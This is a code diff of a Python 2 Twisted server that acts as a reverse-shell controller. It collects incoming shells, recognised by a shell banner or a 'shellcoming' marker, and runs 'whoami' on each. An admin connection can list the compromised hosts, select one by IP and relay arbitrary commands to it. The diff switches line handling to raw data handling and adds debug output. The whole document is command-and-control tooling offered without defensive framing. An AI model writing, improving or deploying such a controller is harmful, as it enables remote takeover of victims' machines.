@@ -15,26 +15,23 @@ control_client=''
 
 
 
-
-
-
 class CmdProtocol(LineReceiver):
 
   delimiter = '\n'
 
-  def processCmd(self, line):
+  def processCmd(self, data):
     global Admintransport
     global transports
-    if line.startswith('admin'):
+    if data.startswith('admin'):
         print self.transport
         Admintransport = self.transport
         print Admintransport.getPeer().host
         log.msg("Admin     %s"%Admintransport)
         for each in transports:
             self.transport.write(str(each.getPeer())+"\n")
-    elif line.startswith('exit'):
+    elif data.startswith('exit'):
       self.transport.loseConnection()
-    elif line.startswith('sh: no job control in this shell'):
+    elif data.startswith('shellcoming') :
       log.msg("shell from %s" % self.client_ip)
       transports.append(self.transport)
       self.transport.write('whoami\n')
@@ -54,30 +51,36 @@ class CmdProtocol(LineReceiver):
     if self.client_ip:
       self.factory.clients.remove(self.client_ip)
 
-  def lineReceived(self, line):
+  def dataReceived(self, data):
     global control_client
     if (Admintransport!=''):
+	print "from",self.transport.getPeer()
         if (self.transport.getPeer().host==Admintransport.getPeer().host):
-            if line.startswith('sc'):
-                ip=str(line).split(':')[1]
+            if data.startswith('sc'):
+                ip=str(data).split(':')[1]
                 print ip
-                control_client=ip
-                self.transport.write("set client ip success")
-            elif line.startswith('lc'):
+                control_client=ip[:-1]
+                self.transport.write("set client ip success\n")
+            elif data.startswith('lc'):
                 for each in transports:
                     self.transport.write(str(each.getPeer())+"\n")
-            elif line.startswith('showcc'):
+            elif data.startswith('showcc'):
                     self.transport.write(control_client)
             elif (control_client!=''):
                 for each in transports:
-                    if each.getPeer().host==control_client:
-                        each.write(str(line)+"\n")
+                    print len(str(each.getPeer().host))
+                    print len(str(control_client))
+                    if str(each.getPeer().host)==str(control_client):
+                        print "get cc"
+                        each.write(data+'\n')
+                        print control_client,data,"exec successful\n"
                         break
-        elif (len(transports)>0) & (control_client!='') & (self.transport.getPeer().host==control_client):
-            Admintransport.write(line+'\n')
+        elif (len(transports)>0) & (control_client!='') & (str(self.transport.getPeer().host)==control_client):
+		print "return result\n"
+        	Admintransport.write(data+"\n")
     else:
-        log.msg('Cmd received from %s : %s' % (self.client_ip, line))
-        self.processCmd(line)
+        log.msg('Cmd received from %s : %s' % (self.client_ip, data))
+        self.processCmd(data)
 
 class MyFactory(ServerFactory):
 
